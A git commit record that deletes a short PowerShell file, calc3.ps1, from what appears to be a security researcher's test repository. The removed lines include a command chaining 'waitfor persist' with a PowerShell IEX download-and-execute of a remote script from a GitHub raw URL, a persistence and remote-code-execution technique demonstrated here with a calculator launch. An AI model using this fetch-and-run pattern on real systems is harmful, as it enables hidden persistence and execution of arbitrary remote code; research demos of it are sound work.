2a58b2bc1f7ac148ff5858f2a47bc3aba2c68f7d
3gstudent <robertpetersen@outlook.com>
2017-06-08 00:46:12 -0700

    Delete calc3.ps1

--- calc3.ps1
+++
@@ -1,3 +0,0 @@
-# $example_code = start-process calc.exe;
-# $example_code;
-cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc.ps1');
